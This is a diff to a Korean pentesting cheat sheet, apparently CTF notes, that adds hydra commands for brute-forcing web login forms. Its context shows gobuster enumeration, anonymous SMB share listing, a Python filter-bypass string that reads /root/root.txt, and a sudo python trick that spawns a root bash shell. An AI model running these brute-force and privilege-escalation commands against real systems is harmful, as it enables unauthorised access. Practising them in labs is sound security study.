@@ -26,10 +26,17 @@ gobuster dir -u [https://example.com] -w ~/wordlists/shortlist.txt
 gobuster dir -u [https://example.com] -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,php3,html,txt
 ```
 
-# 3. OWASP zap
+# 3. hydra
+```
+# hydra (web_ip) http-get-form "(web_url):username=^USER^&password=^PASS^&(나머지 파라미터):(로그인 실패시 뜨는 메세지)" -L (userid dic.txt) -P (pass dic.txt) -V -f
+# hydra -L [username.txt] -P [password.txt] -v -f
+// -v : 결과 출력, -f : 결과 나오는 즉시 종료
+```
+
+# 4. OWASP zap
 Automated Scan ㄱㄱ
 
-# 4. smb
+# 5. smb
 ```
 # smb 공유목록 나열
 smbclient -L //[타켓 IP]/ -N
@@ -38,7 +45,7 @@ smbclient -L //[타켓 IP]/ -N
 smbclient //[타겟 IP]/[sharename] -U guest          # Password for [WORKGROUP\guest]: 엔터
 ```
 
-# 5. sudo escalator
+# 6. sudo escalator
 ```
 # .py 파일에서 filtering bypass
 __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
@@ -47,3 +54,4 @@ __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lowe
 sudo /usr/bin/python3 /home/kali/[파일명].py
 __builtins__.__dict__['__IMPORT__'.lower()]('PTY'.lower()).__dict__['SPAWN'.lower()]('/bin/bash')
 ```
+
